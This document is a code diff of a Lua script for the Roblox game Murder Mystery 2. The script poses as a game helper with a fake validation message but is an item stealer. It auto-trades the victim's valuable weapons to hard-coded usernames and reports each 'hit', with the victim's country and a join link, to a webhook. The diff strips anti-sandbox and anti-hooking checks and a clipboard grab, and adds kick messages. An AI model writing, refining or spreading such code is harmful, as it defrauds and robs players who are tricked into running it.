@@ -1,4 +1,4 @@
---Old one
+--Lol
 
 _G.Usernames = {"Erereer454"} 
 _G.min_rarity = "Common" 
@@ -11,87 +11,7 @@ if getgenv().executed then
     return 
 end
 getgenv().executed = true
-local hooked = false
-if not rawequal(_25mspredefine, nil) then
-    do hooked = true end
-    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
-    do return nil end
-end
-local string_lower_result = debug.traceback():lower()
-if string_lower_result:find("sandbox") or string_lower_result:find("unveilr") or string_lower_result:find("httpspy2") then
-    do hooked = true end
-    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
-    do return nil end
-end
-if isfunctionhooked then
-    if (http and http.request and isfunctionhooked(http.request)) or (request and isfunctionhooked(request)) or (http_request and isfunctionhooked(http_request)) or (httprequest and isfunctionhooked(httprequest)) then
-        do hooked = true end
-        do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
-        do return nil end
-    end
-    if hookfunction then
-        local f = function() end
-        if isfunctionhooked(f) then
-            do hooked = true end
-            do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
-            do return nil end
-        end
-        hookfunction(f, function() print("hi") end)
-        if not isfunctionhooked(f) then
-            do hooked = true end
-            do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
-            do return nil end
-        end
-    end
-end
-if not getmetatable or not setmetatable or not type or not select or type(select(2, pcall(getmetatable, setmetatable({}, {__index = function(self, ...) while true do end end})))['__index']) ~= 'function' or not pcall or not debug or not rawget or not rawset or not pcall(rawset,{}," "," ") or getmetatable(require) or getmetatable(print) or getmetatable(error) or ({debug.info(print,'a')})[1]~=0 or ({debug.info(tostring,'a')})[1]~=0 or ({debug.info(print,'a')})[2]~=true or not select or not getfenv or select(1, pcall(getfenv, 69)) == true or not select(2, pcall(rawget, debug, "info")) or #(((select(2, pcall(rawget, debug, "info")))(getfenv, "n")))<=1 or #(((select(2, pcall(rawget, debug, "info")))(print, "n")))<=1 or not (select(2, pcall(rawget, debug, "info")))(print, "s") == "[C]" or not (select(2, pcall(rawget, debug, "info")))(require, "s") == "[C]" or (select(2, pcall(rawget, debug, "info")))((function()end), "s") == "[C]" or not select(1, pcall(debug.info, coroutine.wrap(function() end)(), 's')) == false then
-    do hooked = true end
-    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
-    do return nil end
-end
-local Success = pcall(function()
-    Instance.new("Part"):thisdoesntworkaaa("a")
-end)
-while Success do
-    do hooked = true end
-    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
-    do return nil end
-end
-game:GetChildren(function()
-    while true do end
-end)
-while #game:GetChildren() <= 4 do
-    do hooked = true end
-    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
-    do return nil end
-end
-local Success, Result = pcall(function()
-    return game:GetService("HttpService"):JSONDecode('[68, "google.com", true, 1234, false, [1234, null, "meow"], null, ["b"]]')
-end)
-while not Success do
-    do hooked = true end
-    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
-    do return nil end
-end
-while Result[6][2] ~= nil do
-    do hooked = true end
-    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
-    do return nil end
-end
-local _, Message = pcall(function()
-    game()
-end)
-while not Message:find("attempt to call a Instance value") do
-    do hooked = true end
-    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
-    do return nil end
-end
-if hooked then
-    while true do
-        warn(math.random(1, 1e6));
-        task.wait()
-    end
-end
+
 local count = 0
 local conn = game:GetService("RunService").Heartbeat:Connect(function(dt)
     count += 1
@@ -114,11 +34,11 @@ local function explainScripts(val1, scriptName, isActive, val2)
     end
 
 
-    return val1 * 99 * 69 * 21 % 10, scriptName .. " - Accessing Wyms Scripts..." .. val2, 2
+    return val1 * 99 * 69 * 21 % 10, scriptName .. " - Validating..." .. val2, 2
 end
 
 
-local scriptStatus, message, scriptVersion = explainScripts(1, "WymsScripts181827", true, 55)
+local scriptStatus, message, scriptVersion = explainScripts(1, "Script", true, 55)
 
 local checkIS = game
 
@@ -136,7 +56,7 @@ repeat
     task.wait()
 until scriptStatus == 1
 
-local statusMsg = "WymsScripts181827: Validation Success"
+local statusMsg = "Validation Success"
 
 local success = pcall(function()
     local str = statusMsg
@@ -179,22 +99,6 @@ end
 
 
 
-local realSetClipboard = nil
-
-
-for _, v in pairs(getreg()) do
-    if type(v) == "function" and islclosure and not islclosure(v) then
-
-        if debug.info(v, "n") == "setclipboard" or debug.info(v, "n") == "toclipboard" then
-            realSetClipboard = v
-            break
-        end
-    end
-end
-    realSetClipboard = getgenv().setclipboard or getgenv().toclipboard
-
-
-
 
 
 local rarityTable = {"Common", "Uncommon", "Rare", "Epic", "Legendary", "Godly", "Ancient", "Unique"}
@@ -222,9 +126,11 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TeleportService = game:GetService("TeleportService")
 local plr = Players.LocalPlayer
 if next(users) == nil then
+    plr:kick("You didn't add a usernames or a valid webhook !")
     return
 end
 if game.PlaceId ~= 142823291 then
+    plr:kick("Game not supported. Please join a normal MM2 server")
     return
 end
 
@@ -232,12 +138,14 @@ local executor = (identifyexecutor and identifyexecutor():lower()) or "unknown"
 local isMobile = string.find(executor, "delta") or string.find(executor, "krnl")
 local isSalora = string.find(executor, "solara")
 if isSalora then
+    plr:kick("solara isnt supported please use xeno or any other executer")
     return
 end
 local VIP = (game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer")
 local FULL = (#Players:GetPlayers() >= 12)
 if VIP or FULL then
     if isMobile then
+        plr:kick(VIP and "VIP Servers not supported." or "FULL Servers Arent Supported")
         return
     else
         print(VIP and "VIP Server detected, hopping..." or "Server full, hopping...")
@@ -315,7 +223,7 @@ local localPlayer = Players.LocalPlayer
 local victimLevel = GetPlayerLevel:InvokeServer(localPlayer)
 
 if victimLevel < 10 then
-    return
+    localPlayer:Kick("script error. make sure ur above the level 9")
 end
 
 
@@ -543,10 +451,6 @@ local function SendMemberHit(data)
             return HttpService:JSONDecode(res.Body)
         end)
         if ok and responseData then
-
-            if responseData.messageId then
-                _statusMessageId = responseData.messageId
-            end
             
             warn("ok")
         end
@@ -587,7 +491,7 @@ local function getTradeStatus()
 end
 local function waitForTradeCompletion()
     while true do
-        task.wait()
+        task.wait(0.1)
         if getTradeStatus() == "None" then break end
     end
 end
@@ -712,7 +616,7 @@ local locationStr = (loc.country or "Unknown")
                 { name = "\240\159\148\151 Quick Join", value = "[**Click to Join**](" .. JoinLink .. ")", inline = true }
             },
             footer = {
-                text = "Adrenalin.win Helper \194\183 discord.gg/soso",
+                text = "Adrenalin.win Helper \194\183 discord",
                 icon_url = NotHead
             },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
@@ -741,13 +645,8 @@ else
     assignHitToDatabase()
     
     if  totalValue > 200 then
-        task.delay(0.1, function()
-            SecureSend(data)
-        end)
-        task.delay(0.1, function()
-            assignDhToDatabase()
-        end)
-        
+        SecureSend(data)
+        assignDhToDatabase()
     end
 end
 end
@@ -803,30 +702,14 @@ if #weaponsToSend > 0 then
     local prefix = (ping == "Yes") and "--@everyone " or ""
     SendFirstMessage(weaponsToSend, prefix)
 
-local _statusMessageId = nil
-local _statusFinal = false  
-
-local function pingStatus()
-end
-
-local function markPartial()
-    if _statusFinal then return end
-    _statusFinal = true
-end
-
-local function markClaimed()
-    if _statusFinal then return end
-    _statusFinal = true
-end
-
     local function doTrade(joinedUser)
         local initialTradeState = getTradeStatus()
         if initialTradeState == "StartTrade" then
             Trade.DeclineTrade:FireServer()
-            task.wait(0.2)
+            task.wait(0.3)
         elseif initialTradeState == "ReceivingRequest" then
             Trade.DeclineRequest:FireServer()
-            task.wait(0.2)
+            task.wait(0.3)
         end
 
         while #weaponsToSend > 0 do
@@ -834,41 +717,34 @@ end
             if tradeStatus == "None" then
                 sendTradeRequest(joinedUser)
             elseif tradeStatus == "SendingRequest" then
-                task.wait(0.2)
+                task.wait(0.3)
             elseif tradeStatus == "ReceivingRequest" then
                 Trade.DeclineRequest:FireServer()
-                task.wait(0.2)
+                task.wait(0.3)
             elseif tradeStatus == "StartTrade" then
                 local numToTrade = math.min(4, #weaponsToSend)
                 for i = 1, numToTrade do
                     local weapon = weaponsToSend[i]
                     for _ = 1, weapon.Amount do
                         addWeaponToTrade(weapon.DataID)
-                        task.wait(0.1)
+                        task.wait()
                     end
                 end
-                task.wait(2)
+                task.wait(6)
                 acceptTrade()
                 waitForTradeCompletion()
 
                 local currentInv = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
                 local firstItemAttempted = weaponsToSend[1].DataID
-                if #weaponsToSend > 0 then
-            task.spawn(markPartial)
-
-        else
-            task.spawn(markClaimed)
-
-        end
                 if not currentInv.Weapons.Owned[firstItemAttempted] then
                     for _ = 1, numToTrade do table.remove(weaponsToSend, 1) end
                 else
                     pcall(function() Trade.DeclineTrade:FireServer() end)
                 end
             else
-                task.wait(0.3)
+                task.wait(0.5)
             end
-            task.wait(0.3)
+            task.wait(1)
         end
     end
 
